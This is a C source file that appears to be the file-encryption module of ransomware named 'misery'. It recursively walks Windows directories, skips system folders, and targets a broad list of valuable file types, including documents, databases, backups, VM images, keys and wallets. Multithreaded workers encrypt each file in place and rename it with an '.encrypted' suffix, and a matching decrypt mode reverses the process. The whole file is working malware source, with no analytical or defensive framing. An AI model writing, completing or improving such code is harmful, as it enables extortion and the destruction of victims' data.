#include "fileops.h"
#include "crypto.h"
#include "misery_config.h"
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <inttypes.h>

static bool IsTargetExtension(const char *path);

/* Skip list — system dirs */
static const char *g_skip[] = {
    "\\Windows", "\\System32", "\\SysWOW64",
    "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot",
    "\\ProgramData\\Microsoft",
    "\\.venv",
    "\\node_modules",
    NULL
};

/* Extensions to encrypt */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn",
    NULL
};

/* ── Internal context ── */
struct FILEOPS_CTX {
    FILEOPS_CONFIG    config;
    FILEOPS_STATS     stats;
    bool              statsInitialized;
    CRITICAL_SECTION  statsLock;
    HANDLE           *threads;
    DWORD             threadCount;
    struct WorkItem {
        struct WorkItem *next;
        WCHAR   path[];
    }                *queueHead;
    struct WorkItem **queueTail;
    LONG              queueCount;
    LONG              activeWorkers;
    CRITICAL_SECTION  queueLock;
    CONDITION_VARIABLE queueNotEmpty;
    CONDITION_VARIABLE queueIdle;
    volatile LONG     shutdownFlag;
};

/* ── Worker thread ── */
static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)lpParam;
    const bool decryptMode = ctx->config.decryptMode;

    for (;;) {
        struct WorkItem *item = NULL;

        EnterCriticalSection(&ctx->queueLock);
        while (ctx->queueHead == NULL && !ctx->shutdownFlag) {
            SleepConditionVariableCS(&ctx->queueNotEmpty, &ctx->queueLock, INFINITE);
        }
        if (ctx->shutdownFlag && ctx->queueHead == NULL) {
            LeaveCriticalSection(&ctx->queueLock);
            break;
        }
        item = ctx->queueHead;
        ctx->queueHead = item->next;
        if (ctx->queueHead == NULL) ctx->queueTail = &ctx->queueHead;
        ctx->queueCount--;
        ctx->activeWorkers++;
        LeaveCriticalSection(&ctx->queueLock);

        /* Convert path to narrow */
        char narrowPath[FILEOPS_MAX_PATH];
        int narrowLen = WideCharToMultiByte(CP_UTF8, 0, item->path, -1,
                                            narrowPath, sizeof(narrowPath), NULL, NULL);
        HeapFree(GetProcessHeap(), 0, item);
        item = NULL;

        if (narrowLen <= 0 || narrowLen >= (int)sizeof(narrowPath)) {
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            LeaveCriticalSection(&ctx->statsLock);
            EnterCriticalSection(&ctx->queueLock);
            ctx->activeWorkers--;
            WakeConditionVariable(&ctx->queueIdle);
            LeaveCriticalSection(&ctx->queueLock);
            continue;
        }

        /* ── Encrypt or Decrypt ── */
        HANDLE hFile = INVALID_HANDLE_VALUE;
        BYTE  *buf   = NULL;
        BYTE  *plaintext = NULL;
        DWORD  bufSize = 0;
        DWORD  fs = 0;
        bool   success = false;

        /* ── FIX: Stronger key file exclusion — use strstr to catch at ANY path depth ── */
        if (!decryptMode) {
            if (strstr(narrowPath, "misery.key") != NULL) {
                MiseryLog(MISERY_LOG_INFO, "FileOps: Worker skipping key file: %s", narrowPath);
                success = true;
                EnterCriticalSection(&ctx->statsLock);
                ctx->stats.filesSucceeded++;
                LeaveCriticalSection(&ctx->statsLock);
                goto worker_done;
            }
        }

        hFile = CreateFileA(narrowPath, GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open %s (err: %lu)",
                      narrowPath, GetLastError());
            goto worker_done;
        }

        fs = GetFileSize(hFile, NULL);
        if (fs == INVALID_FILE_SIZE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: GetFileSize failed for %s (err: %lu)",
                      narrowPath, GetLastError());
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
            goto worker_done;
        }

        if (fs == 0) {
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Skipped empty file: %s", narrowPath);
            success = true;
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);
            goto worker_done;
        }

        if (decryptMode) {
            /* ══════════════════════════════════════════════════
             * DECRYPT PATH
             * ══════════════════════════════════════════════════ */
            bufSize = fs;
            buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buf) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) failed (err: %lu)",
                          bufSize, GetLastError());
                goto worker_done;
            }
            DWORD rd = 0;
            if (!ReadFile(hFile, buf, fs, &rd, NULL) || rd != fs) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                          narrowPath, GetLastError());
                goto worker_done;
            }
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

            DWORD maxPlainCap = fs;
            plaintext = (BYTE *)VirtualAlloc(NULL, maxPlainCap,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!plaintext) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                          maxPlainCap, GetLastError());
                goto worker_done;
            }

            DWORD decLen = 0;
            CRYPTO_ERROR cerr = DecryptBuffer(ctx->config.crypto_ctx,
                                              buf, fs,
                                              plaintext, &decLen, maxPlainCap);
            if (cerr != CRYPTO_SUCCESS) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: DecryptBuffer failed for %s: %s (code=%d)",
                          narrowPath, GetErrorString(cerr), cerr);
                goto worker_done;
            }

            /* Build decrypted file path: strip .encrypted suffix */
            char origPath[FILEOPS_MAX_PATH];
            strncpy(origPath, narrowPath, sizeof(origPath) - 1);
            origPath[sizeof(origPath) - 1] = '\0';

            /* Find LAST occurrence of .encrypted */
            char *encPos = NULL;
            for (char *p = origPath; *p; p++) {
                if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0) {
                    encPos = p;
                }
            }
            if (!encPos) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot find .encrypted in path: %s", narrowPath);
                goto worker_done;
            }
            *encPos = '\0';

            /* Write decrypted data to temp file */
            char tmpPath[FILEOPS_MAX_PATH];
            snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", origPath);

            HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, FILE_SHARE_READ,
                                        NULL, CREATE_ALWAYS,
                                        FILE_ATTRIBUTE_NORMAL, NULL);
            if (hWrite == INVALID_HANDLE_VALUE) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
                          tmpPath, GetLastError());
                goto worker_done;
            }
            DWORD wr = 0;
            BOOL writeOk = WriteFile(hWrite, plaintext, decLen, &wr, NULL);
            CloseHandle(hWrite);
            if (!writeOk || wr != decLen) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: WriteFile failed for %s (err: %lu)",
                          tmpPath, GetLastError());
                DeleteFileA(tmpPath);
                goto worker_done;
            }

            /* Rename .tmp → original (stripped name) */
            if (!MoveFileExA(tmpPath, origPath,
                             MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
                          tmpPath, origPath, GetLastError());
                DeleteFileA(tmpPath);
                goto worker_done;
            }

            /* Delete the .encrypted file */
            DeleteFileA(narrowPath);

            success = true;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) → %s",
                      narrowPath, fs, origPath);
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.bytesProcessed += fs;
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);

        } else {
            /* ══════════════════════════════════════════════════
             * ENCRYPT PATH
             * ══════════════════════════════════════════════════ */
            bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
            buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buf) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) failed (err: %lu)",
                          bufSize, GetLastError());
                goto worker_done;
            }

            plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!plaintext) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                          fs, GetLastError());
                goto worker_done;
            }

            DWORD rd = 0;
            if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                          narrowPath, GetLastError());
                goto worker_done;
            }
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

            DWORD encLen = 0;
            CRYPTO_ERROR cerr = EncryptBuffer(ctx->config.crypto_ctx,
                                              plaintext, rd,
                                              buf, &encLen, bufSize);

            /* Wipe plaintext from memory IMMEDIATELY */
            SecureZeroMemory(plaintext, fs);
            VirtualFree(plaintext, 0, MEM_RELEASE);
            plaintext = NULL;

            if (cerr != CRYPTO_SUCCESS) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
                          narrowPath, GetErrorString(cerr), cerr);
                goto worker_done;
            }

            /* Write encrypted data to .tmp */
            char tmpPath[FILEOPS_MAX_PATH];
            snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);

            HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, FILE_SHARE_READ,
                                        NULL, CREATE_ALWAYS,
                                        FILE_ATTRIBUTE_NORMAL, NULL);
            if (hWrite == INVALID_HANDLE_VALUE) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
                          tmpPath, GetLastError());
                goto worker_done;
            }
            DWORD wr = 0;
            BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
            CloseHandle(hWrite);
            if (!writeOk || wr != encLen) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: WriteFile failed (wrote %lu/%lu, err: %lu)",
                          tmpPath, wr, encLen, GetLastError());
                DeleteFileA(tmpPath);
                goto worker_done;
            }

            /* Atomic rename: .tmp → original (overwrite with encrypted data) */
            if (!MoveFileExA(tmpPath, narrowPath,
                             MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
                          tmpPath, narrowPath, GetLastError());
                DeleteFileA(tmpPath);
                goto worker_done;
            }

            /* Rename original → original.encrypted */
            char encPath[FILEOPS_MAX_PATH];
            snprintf(encPath, sizeof(encPath), "%s%s", narrowPath, ENC_EXT);
            if (!MoveFileExA(narrowPath, encPath,
                             MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
                          narrowPath, encPath, GetLastError());
                goto worker_done;
            }

            success = true;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) → %s",
                      narrowPath, fs, encPath);
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.bytesProcessed += fs;
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);
        }

    worker_done:
        if (!success) {
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            ctx->stats.lastSystemError = GetLastError();
            LeaveCriticalSection(&ctx->statsLock);
        }

        /* ── Safe cleanup — all pointers check for NULL before freeing ── */
        if (buf) {
            SecureZeroMemory(buf, bufSize);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = NULL;
        }
        if (plaintext) {
            SecureZeroMemory(plaintext, fs > 0 ? fs : 4096);
            VirtualFree(plaintext, 0, MEM_RELEASE);
            plaintext = NULL;
        }
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

        EnterCriticalSection(&ctx->queueLock);
        ctx->activeWorkers--;
        WakeConditionVariable(&ctx->queueIdle);
        LeaveCriticalSection(&ctx->queueLock);
    }
    return 0;
}

/* ── Enqueue ── */
static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
    if (!ctx || !fullPath) return;
    size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);
    struct WorkItem *item = (struct WorkItem *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                  sizeof(struct WorkItem) + pathBytes);
    if (!item) return;
    memcpy(item->path, fullPath, pathBytes);
    item->next = NULL;
    EnterCriticalSection(&ctx->queueLock);
    *ctx->queueTail = item;
    ctx->queueTail = &item->next;
    ctx->queueCount++;
    WakeConditionVariable(&ctx->queueNotEmpty);
    LeaveCriticalSection(&ctx->queueLock);
}

/* ── Traverse ── */
static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
    if (depth > MAX_DEPTH) return;
    if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir)) return;

    WCHAR pattern[FILEOPS_MAX_PATH];
    _snwprintf(pattern, FILEOPS_MAX_PATH - 1, L"%s\\*", dir);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard,
                                     &fd, FindExSearchNameMatch, NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE) {
        char narrowDir[FILEOPS_MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, dir, -1, narrowDir, sizeof(narrowDir), NULL, NULL);
        MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open dir: %s (err: %lu)",
                  narrowDir, GetLastError());
        return;
    }

    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;

        WCHAR full[FILEOPS_MAX_PATH];
        int written = _snwprintf(full, FILEOPS_MAX_PATH - 1, L"%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(FILEOPS_MAX_PATH - 1)) continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TraverseInternal(ctx, full, depth + 1);
        } else {
            char narrow[FILEOPS_MAX_PATH];
            if (WideCharToMultiByte(CP_UTF8, 0, full, -1,
                                    narrow, sizeof(narrow), NULL, NULL) <= 0)
                continue;

            if (ctx->config.decryptMode) {
                /* ══════════════════════════════════════════
                 * DECRYPT TRAVERSE: only .encrypted files
                 * ══════════════════════════════════════════ */
                const char *encPos = NULL;
                for (const char *p = narrow; *p; p++) {
                    if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0)
                        encPos = p;
                }
                if (!encPos) continue;
                if (encPos[ENC_EXT_LEN] != '\0') continue;

                /* Check if original already exists (already decrypted) */
                char origPath[FILEOPS_MAX_PATH];
                strncpy(origPath, narrow, sizeof(origPath) - 1);
                origPath[sizeof(origPath) - 1] = '\0';
                char *ep = origPath + (encPos - narrow);
                *ep = '\0';

                if (GetFileAttributesA(origPath) != INVALID_FILE_ATTRIBUTES) {
                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping (already decrypted): %s", narrow);
                    continue;
                }

                MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing decrypt: %s", narrow);
                EnqueueFile(ctx, full);

            } else {
                /* ── FIX: Use strstr to catch misery.key at ANY path depth ── */
                if (strstr(narrow, "misery.key") != NULL) {
                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
                    continue;
                }

                if (!IsTargetExtension(narrow)) continue;

                /* Skip if .encrypted already exists (file already processed) */
                char encPath[FILEOPS_MAX_PATH];
                snprintf(encPath, sizeof(encPath), "%s%s", narrow, ENC_EXT);
                if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES) continue;

                MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing encrypt: %s", narrow);
                EnqueueFile(ctx, full);
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

/* ═══════════════════════════════════════════════════════════════
 * PUBLIC API
 * ═══════════════════════════════════════════════════════════════ */

FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILEOPS_CTX));
    if (!ctx) return NULL;

    if (config) {
        ctx->config = *config;
    } else {
        ctx->config.threadCount = FILEOPS_DEFAULT_THREADS;
        ctx->config.ioBufferSize = FILEOPS_IO_CHUNK;
        ctx->config.flags = FILEOPS_FLAG_RECURSIVE;
        ctx->config.extension[0] = L'\0';
        ctx->config.pfnShouldSkip = NULL;
        ctx->config.crypto_ctx = NULL;
        ctx->config.decryptMode = false;
    }

    if (!ctx->config.crypto_ctx) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: crypto_ctx is NULL!");
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    if (ctx->config.threadCount < 1) ctx->config.threadCount = 1;
    if (ctx->config.threadCount > 128) ctx->config.threadCount = 128;

    ctx->queueTail = &ctx->queueHead;
    ctx->threadCount = ctx->config.threadCount;

    InitializeCriticalSection(&ctx->statsLock);
    ctx->statsInitialized = true;
    InitializeCriticalSection(&ctx->queueLock);
    InitializeConditionVariable(&ctx->queueNotEmpty);
    InitializeConditionVariable(&ctx->queueIdle);

    ctx->threads = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                              sizeof(HANDLE) * ctx->threadCount);
    if (!ctx->threads) {
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    DWORD threadsCreated = 0;
    for (DWORD i = 0; i < ctx->threadCount; i++) {
        HANDLE h = CreateThread(NULL, 0, WorkerThread, ctx, 0, NULL);
        if (h) { ctx->threads[i] = h; threadsCreated++; }
        else    { ctx->threads[i] = NULL; }
    }

    if (threadsCreated == 0) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: Failed to create worker threads");
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx->threads);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    MiseryLog(MISERY_LOG_INFO, "FileOps: Created context with %lu threads (mode: %s)",
              threadsCreated, ctx->config.decryptMode ? "DECRYPT" : "ENCRYPT");
    return ctx;
}

void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath) {
    if (!ctx || !rootPath) return;
    char narrowPath[FILEOPS_MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, rootPath, -1, narrowPath, sizeof(narrowPath), NULL, NULL);
    MiseryLog(MISERY_LOG_INFO, "FileOps: Starting traverse of: %s", narrowPath);
    TraverseInternal(ctx, rootPath, 0);
}

void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
    if (!ctx) return;
    EnterCriticalSection(&ctx->queueLock);
    while (ctx->queueCount > 0 || ctx->activeWorkers > 0) {
        SleepConditionVariableCS(&ctx->queueIdle, &ctx->queueLock, INFINITE);
    }
    LeaveCriticalSection(&ctx->queueLock);
}

void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats) {
    if (!ctx || !outStats) return;
    EnterCriticalSection(&ctx->statsLock);
    *outStats = ctx->stats;
    LeaveCriticalSection(&ctx->statsLock);
}

void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
    if (!ctx) return;
    EnterCriticalSection(&ctx->queueLock);
    InterlockedExchange(&ctx->shutdownFlag, 1);
    WakeAllConditionVariable(&ctx->queueNotEmpty);
    LeaveCriticalSection(&ctx->queueLock);

    for (DWORD i = 0; i < ctx->threadCount; i++) {
        if (ctx->threads[i]) {
            WaitForSingleObject(ctx->threads[i], INFINITE);
            CloseHandle(ctx->threads[i]);
        }
    }

    struct WorkItem *item = ctx->queueHead;
    while (item) {
        struct WorkItem *next = item->next;
        HeapFree(GetProcessHeap(), 0, item);
        item = next;
    }

    HeapFree(GetProcessHeap(), 0, ctx->threads);
    DeleteCriticalSection(&ctx->statsLock);
    DeleteCriticalSection(&ctx->queueLock);
    HeapFree(GetProcessHeap(), 0, ctx);
}

bool FileOps_DefaultShouldSkip(const WCHAR* path) {
    char narrow[FILEOPS_MAX_PATH];
    if (!WideCharToMultiByte(CP_UTF8, 0, path, -1, narrow, sizeof(narrow), NULL, NULL))
        return false;
    for (int i = 0; g_skip[i]; i++) {
        if (strstr(narrow, g_skip[i])) return true;
    }
    return false;
}

/* ── FIX: Hard-exclude misery.key at the extension check level ── */
static bool IsTargetExtension(const char* path) {
    if (!path) return false;

    /* FIX: Never encrypt the key file, regardless of where it sits */
    if (strstr(path, "misery.key") != NULL) return false;

    const char *dot = strrchr(path, '.');
    if (!dot) return false;
    for (int i = 0; g_ext[i]; i++) {
        if (_stricmp(dot, g_ext[i]) == 0) return true;
    }
    return false;
}